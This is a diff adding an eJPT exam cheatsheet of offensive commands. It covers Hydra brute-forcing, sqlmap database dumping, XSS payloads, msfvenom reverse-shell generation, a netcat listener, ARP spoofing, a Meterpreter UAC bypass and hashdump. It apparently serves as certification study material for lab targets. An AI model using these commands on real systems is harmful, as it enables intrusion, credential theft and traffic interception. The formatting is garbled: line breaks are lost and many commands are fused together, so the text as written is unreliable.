@@ -1,0 +1,115 @@
+# **eJPT-Cheatsheet**
+
+# 
+
+**This is a Cheatsheet for eJPT exam + course.**
+
+## **Nmap**
+
+**nmap -sn 10.10.10.0/24nmap -sV -p- -iL targets -oN nmap.initial -vnmap -A -p- -iL targets -oN nmap.aggressive -vnmap -p --script=vuln -v**
+
+## **fPing**
+
+**fping -a -g 10.10.10.0/24 2>/dev/null > targets**
+
+## **IP Route**
+
+**Syntaxip route add <Network-range> via <router-IP> dev <interface>eg.ip route add 10.10.10.0/24 via 10.10.11.1 dev tap0**
+
+## **John**
+
+**john --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-md5unshadow passwd shadow > unshadowed.txtjohn --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt**
+
+## **dirb**
+
+**dirb http://10.10.10.10/dirb http://10.10.10.10/dir -u admin:admin**
+
+***I suggest you to use dirbuster for better speed. Keep the threads at 20. Use /usr/share/wordlists/dirb/common.txt wordlist.***
+
+## **Netcat**
+
+**Listening for reverse shellnc -nvlp 1234**
+
+**Banner Grabbingnc -nv 10.10.10.10 <port>**
+
+## **SQLMap**
+
+### **Check if injection exists**
+
+**sqlmap -r Post.reqsqlmap -u "http://10.10.10.10/file.php?id=1" -p idsqlmap -u "http://10.10.10.10/login.php" --data="user=admin&password=admin"**
+
+### **Get database if injection Exists**
+
+**sqlmap -r login.req --dbssqlmap -u "http://10.10.10.10/file.php?id=1" -p id --dbssqlmap -u "http://10.10.10.10/login.php" --data="user=admin&password=admin" --dbs\**
+
+### **Get Tables in a Database**
+
+**sqlmap -r login.req -D dbname --tablessqlmap -u "http://10.10.10.10/file.php?id=1" -p id -D dbname --tablessqlmap -u "http://10.10.10.10/login.php" --data="user=admin&password=admin" -D dbname --tables**
+
+### **Get data in a Database tables**
+
+**sqlmap -r login.req -D dbname -T table_name --dumpsqlmap -u "http://10.10.10.10/file.php?id=1" -p id -D dbname -T table_name --dumpsqlmap -u "http://10.10.10.10/login.php" --data="user=admin&password=admin" -D dbname -T table_name --dump**
+
+## **Hydra**
+
+**SSH Login Bruteforcinghydra -v -V -u -L users.txt -P passwords.txt -t 1 -u 10.10.10.10 sshhydra -v -V -u -l root -P passwords.txt -t 1 -u 10.10.10.10 ssh*You can use same for FTP, just replace ssh with ftp***
+
+**HTTP POST Formhydra http://10.10.10.10/ http-post-form "/login.php:user=^USER^&password=^PASS^:Incorrect credentials" -L usernames.txt -P passwords.txt -f -V**
+
+***You will know which wordlists to use when the time comes***
+
+## **XSS**
+
+**<script>alert(1)</script><ScRiPt>alert(1)</ScRiPt>**
+
+***This is a great filter bypass cheatsheet*https://owasp.org/www-community/xss-filter-evasion-cheatsheet**
+
+## **msfvenom shells**
+
+**JSP Java Meterpreter Reverse TCPmsfvenom -p java/jsp_shell_reverse_tcp LHOST= LPORT= -f raw > shell.jsp**
+
+**WARmsfvenom -p java/jsp_shell_reverse_tcp LHOST= LPORT= -f war > shell.war**
+
+**PHPmsfvenom -p php/meterpreter_reverse_tcp LHOST= LPORT= -f raw > shell.phpcat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php**
+
+## **Metasploit Meterpreter autoroute**
+
+**run autoroute -s 10.10.10.0/24**
+
+## **ARPSpoof**
+
+**echo 1 > /proc/sys/net/ipv4/ip_forwardarpspoof -i -t -rarpspoof -i tap0 -t 10.100.13.37 -r 10.100.13.36**
+
+## **SMB Enumeration**
+
+**Get shares, users, groups, password policysmbclient -L //10.10.10.10/enum4linux -U -M -S -P -G 10.10.10.10nmap --script=smb-enum-users,smb-os-discovery,smb-enum-shares,smb-enum-groups,smb-enum-domains 10.10.10.10 -p 135,139,445 -vnmap -p445 --script=smb-vuln-* 10.10.10.10 -v**
+
+**Access Sharesmbclient //10.10.10.10/share_name**
+
+## **FTP Enumeration**
+
+**nmap --script=ftp-anon 10.10.10.10 -p21 -vnmap -A -p21 10.10.10.10 -v**
+
+**Login to FTP serverftp 10.10.10.10**
+
+## **Meterpreter**
+
+**psgetuidgetpidgetsystemps -U SYSTEM**
+
+**CHECK UAC/Privilegesrun post/windows/gather/win_privs**
+
+**BYPASS UAC*Background the session first*exploit/windows/local/bypassuacset session**
+
+**After PrivEscmigrate <pid>hashdump**
+
+## **Windows Command Line**
+
+**To search for a file starting from current directory**
+
+**dir /b/s "*.conf*"dir /b/s "*.txt*"dir /b/s "*filename*"**
+
+**Check routing tableroute printnetstat -r**
+
+**Check Usersnet users**
+
+**List drives on the machinewmic logicaldisk get Caption,Description,providername**
